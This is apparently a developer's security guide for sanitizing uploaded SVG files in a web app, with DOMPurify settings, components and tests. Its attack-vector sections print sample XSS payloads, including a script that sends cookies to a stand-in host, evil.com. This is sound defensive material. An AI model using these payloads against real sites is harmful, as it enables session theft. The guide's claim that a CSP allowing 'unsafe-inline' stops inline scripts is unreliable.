# SVG Upload Security Guide

Complete guide for secure SVG handling in balanceUp.

---

## 🎯 The Problem

SVG files can contain JavaScript and execute XSS attacks:

### Example: Malicious SVG

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <!-- XSS via script tag -->
  <script>
    alert('XSS Attack!');
    // Steal cookies
    fetch('https://evil.com?cookie=' + document.cookie);
  </script>
</svg>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <!-- XSS via event handler -->
  <circle onload="alert('XSS')" />
</svg>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <!-- XSS via foreignObject + HTML -->
  <foreignObject>
    <body onload="alert('XSS')">
      <script>maliciousCode()</script>
    </body>
  </foreignObject>
</svg>
```

**Without sanitization:** These would execute JavaScript! ⚠️

---

## ✅ Our Solution

### 1. DOMPurify Sanitization

**Library:** `isomorphic-dompurify`

**Configuration:**
```typescript
DOMPurify.sanitize(svgString, {
  USE_PROFILES: { svg: true, svgFilters: true },
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'foreignObject'],
  FORBID_ATTR: ['onload', 'onerror', 'onclick', 'onmouseover', ...],
  ALLOW_DATA_ATTR: false,
});
```

**What it removes:**
- ✅ `<script>` tags
- ✅ `<iframe>`, `<object>`, `<embed>`
- ✅ `<foreignObject>` (can contain HTML)
- ✅ Event handlers (onclick, onload, etc.)
- ✅ `javascript:` URLs
- ✅ Data URIs (can encode JS)

### 2. File Validation

**Checks:**
```typescript
- File size (<1 MB) - prevents DoS
- MIME type (image/svg+xml)
- File extension (.svg)
- Valid SVG structure (<svg> tag present)
```

### 3. Double Sanitization

**Process:**
1. Validate file (size, type, structure)
2. Sanitize content (remove dangerous elements)
3. Verify result (still valid SVG after sanitization)

**If any step fails:** Upload is rejected.

---

## 🔧 Implementation

### 1. SVG Upload Component

```typescript
import { SVGUpload } from '@/components/upload/SVGUpload';

export function ProfilePage() {
  const handleUpload = async (sanitizedSVG: string, fileName: string) => {
    // Upload to Firebase Storage
    const url = await uploadToStorage(sanitizedSVG, fileName);
    
    // Save URL to Firestore
    await updateDoc(userRef, { avatar: url });
  };

  return <SVGUpload onUpload={handleUpload} />;
}
```

**Features:**
- Automatic validation & sanitization
- Preview of cleaned SVG
- User-friendly error messages
- Progress indication

### 2. Display Sanitized SVG

```typescript
import { SafeSVG } from '@/components/SafeSVG';

// From URL
<SafeSVG src="https://storage.example.com/icon.svg" />

// From string
<SafeSVG content={svgString} />
```

**Features:**
- Always sanitizes before rendering
- Loading states
- Error handling
- Accessibility (ARIA labels)

### 3. Direct Sanitization

```typescript
import { sanitizeSVG, validateAndSanitizeSVG } from '@/lib/svg-sanitizer';

// Sanitize string
const clean = sanitizeSVG(svgString);

// Validate + sanitize file
const result = await validateAndSanitizeSVG(file);
if (result.valid) {
  uploadToServer(result.content);
} else {
  alert(result.error);
}
```

---

## 🧪 Testing

### Test Cases

**1. Valid SVG (should pass):**
```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="blue" />
</svg>
```

**2. XSS via script (should be sanitized):**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>
```
**After sanitization:**
```xml
<svg xmlns="http://www.w3.org/2000/svg"></svg>
```

**3. XSS via event handler (should be sanitized):**
```xml
<svg onload="alert('XSS')">
  <circle cx="50" cy="50" r="40" />
</svg>
```
**After sanitization:**
```xml
<svg>
  <circle cx="50" cy="50" r="40"></circle>
</svg>
```

**4. XSS via foreignObject (should be removed):**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <body onload="alert('XSS')">Evil</body>
  </foreignObject>
</svg>
```
**After sanitization:**
```xml
<svg xmlns="http://www.w3.org/2000/svg"></svg>
```

**5. Too large file (should be rejected):**
```typescript
// File size > 1 MB
// Error: "SVG-Datei zu groß (max. 1 MB)"
```

### Automated Tests

```typescript
// tests/svg-sanitizer.test.ts
import { sanitizeSVG, validateSVGFile } from '@/lib/svg-sanitizer';

describe('SVG Sanitization', () => {
  it('should remove script tags', () => {
    const malicious = '<svg><script>alert("XSS")</script></svg>';
    const clean = sanitizeSVG(malicious);
    expect(clean).not.toContain('<script');
    expect(clean).toContain('<svg');
  });

  it('should remove event handlers', () => {
    const malicious = '<svg onload="alert(1)"><circle /></svg>';
    const clean = sanitizeSVG(malicious);
    expect(clean).not.toContain('onload');
  });

  it('should remove foreignObject', () => {
    const malicious = '<svg><foreignObject><body onload="alert(1)"></foreignObject></svg>';
    const clean = sanitizeSVG(malicious);
    expect(clean).not.toContain('foreignObject');
  });

  it('should preserve valid SVG', () => {
    const valid = '<svg><circle cx="50" cy="50" r="40" fill="blue" /></svg>';
    const clean = sanitizeSVG(valid);
    expect(clean).toContain('<circle');
    expect(clean).toContain('cx="50"');
  });
});
```

---

## 🚨 Security Best Practices

### 1. Never Trust User Input

**Always sanitize:**
- ✅ Files uploaded by users
- ✅ SVG from external URLs
- ✅ SVG from databases (could be compromised)

**Never:**
- ❌ `dangerouslySetInnerHTML` without sanitization
- ❌ Direct file uploads to public URLs
- ❌ Bypass validation "just this once"

### 2. Content Security Policy

**Already configured** in `next.config.ts`:

```typescript
"img-src 'self' blob: data: https://firebasestorage.googleapis.com",
"script-src 'self' 'unsafe-inline'", // Limit script execution
```

**Prevents:**
- XSS from inline scripts
- Unauthorized resource loading

### 3. File Size Limits

**Current limit:** 1 MB

**Why:**
- Prevents DoS attacks
- Reduces storage costs
- Improves performance

### 4. MIME Type Validation

**Check both:**
- File extension (`.svg`)
- MIME type (`image/svg+xml`)

**Why:**
- Prevents file type confusion
- Blocks disguised executables

### 5. Sanitize on Read

**Even if sanitized on upload:**
- Sanitize again when displaying
- Database could be compromised
- Better safe than sorry

```typescript
// Always sanitize, even from trusted sources
<SafeSVG src={trustedURL} />
```

---

## 🔍 Common Attack Vectors

### 1. Script Injection

**Attack:**
```xml
<svg><script>fetch('https://evil.com?cookie='+document.cookie)</script></svg>
```

**Prevention:** Remove `<script>` tags ✅

### 2. Event Handler XSS

**Attack:**
```xml
<svg onload="window.location='https://evil.com'"></svg>
```

**Prevention:** Remove event attributes ✅

### 3. Data URI XSS

**Attack:**
```xml
<svg>
  <image href="data:image/svg+xml,<svg onload='alert(1)'></svg>" />
</svg>
```

**Prevention:** Block data URIs ✅

### 4. Foreign Object HTML

**Attack:**
```xml
<svg>
  <foreignObject>
    <iframe src="javascript:alert('XSS')"></iframe>
  </foreignObject>
</svg>
```

**Prevention:** Remove `<foreignObject>` ✅

### 5. Entity Expansion (Billion Laughs)

**Attack:**
```xml
<!DOCTYPE svg [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  ...
]>
<svg>&lol9;</svg>
```

**Prevention:** File size limit + DOMPurify ✅

---

## ✅ Security Checklist

**Before Production:**
- [x] DOMPurify installed
- [x] SVG sanitization implemented
- [x] File validation (size, type, structure)
- [x] Upload component with preview
- [x] SafeSVG display component
- [x] CSP headers configured
- [ ] Automated tests written
- [ ] Security audit completed
- [ ] Penetration testing done

**Ongoing:**
- [ ] Monitor for bypass attempts
- [ ] Keep DOMPurify updated
- [ ] Review security logs
- [ ] Test with new attack vectors

---

## 📚 Resources

**Tools:**
- [DOMPurify](https://github.com/cure53/DOMPurify) - HTML/SVG sanitizer
- [SVGOMG](https://jakearchibald.github.io/svgomg/) - SVG optimizer
- [SVG Security Checker](https://svg-security-checker.com/)

**Documentation:**
- [OWASP SVG Security](https://cheatsheetseries.owasp.org/cheatsheets/SVG_Security_Cheat_Sheet.html)
- [SVG XSS Vectors](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#svg)
- [MDN: SVG Security](https://developer.mozilla.org/en-US/docs/Web/SVG/Tutorial/Security)

---

**Status:** ✅ Fully Implemented  
**Security Level:** High  
**Last Updated:** 2026-03-01
